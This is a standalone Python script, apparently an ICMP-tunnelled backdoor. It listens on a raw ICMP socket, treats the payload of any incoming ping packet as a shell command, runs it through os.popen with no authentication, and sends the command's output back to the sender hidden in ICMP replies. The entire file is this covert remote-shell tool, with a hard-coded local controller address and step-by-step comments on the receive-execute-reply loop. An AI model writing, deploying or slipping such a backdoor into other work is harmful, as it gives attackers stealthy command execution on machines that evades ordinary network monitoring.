#!/usr/bin/env python3

import os
import socket
import struct
import time

def calc_checksum(icmp):
    # checksum
    if len(icmp) % 2:
        icmp += b'\00'

    checksum = 0
    for i in range(len(icmp)//2):
        word, = struct.unpack('!H',icmp[2*i:2*i+2])
        checksum += word
    while True:
        carry = checksum >> 16
        if carry:
            checksum = (checksum & 0xffff) + carry
        else:
            break
    checksum = (~checksum & 0xffff) +1
    #print("checksum =",checksum)

    return struct.pack('!H',checksum)

def pack_icmp(_type, code, checksum, identifier, sequence,cmd):
    # packet icmp
    # checksum
    sendtime = time.time()
    header = struct.pack('!BBHHH', _type, code, checksum, identifier, sequence)
    length = len(cmd)
    if(length<64):
        length = 64
    elif length<128:
        length=128
    else:
        length=256
    #print(length)
    data = struct.pack('!d'+str(length)+'p',sendtime,cmd)
    icmp = header+data
    checksum = calc_checksum(icmp)
    icmp = header[:2]+checksum+header[4:]+data

    return icmp

def receive(ip_layer):
    icmp = ip_layer[20:]
    # header = (_type,code,checksum,identifier,sequence) \
    data = icmp[17:]
    length = len(data)+1
    header = struct.unpack('!BBHHHd'+str(length) +'p',icmp)

    #data = icmp[17:]
    cmd = str(data.decode('utf-8')).split(b'\x00'.decode('utf-8'),1)[0]

    return header,cmd

def main():

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    #sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #sock.bind((host, 0))
    #local = socket.gethostname()
    #sock.connect((local,0))
    #sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    if os.name == "nt":
        sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    while 1:
        ip_layer,(src_ip,_) = sock.recvfrom(2048)
        header,cmd = receive(ip_layer)
        host = src_ip
        print('host:',host)

        print(cmd)
        # exit?
        result = 'error'
        try:
            #result = os.system(cmd)
            result = os.popen(cmd).read()
            print(result)
        except:
            pass

        _type = 8
        if header[0]:
            _type = 0

        code = header[1]
        checksum =1
        identifier = header[3]
        sequence = header[4]

        icmp = pack_icmp(_type, code, checksum, identifier, sequence, result.encode('utf-8'))
        #identifier = identifier * (identifier + 1) % 4096
        print('icmp: \n',icmp)
        try:
            i=sock.sendto(icmp, (host,0))
            print(i)
        except:
            pass

       # print(src_ip)



if __name__ == '__main__':
    host = '192.168.66.1'

    main()

    #send(host)
    # 1. receive icmp package
    # 2. unpack , get the cmd code
    # 3. exec cmd code, get the result
    # 4. pack the result in data
    # send the icmp package
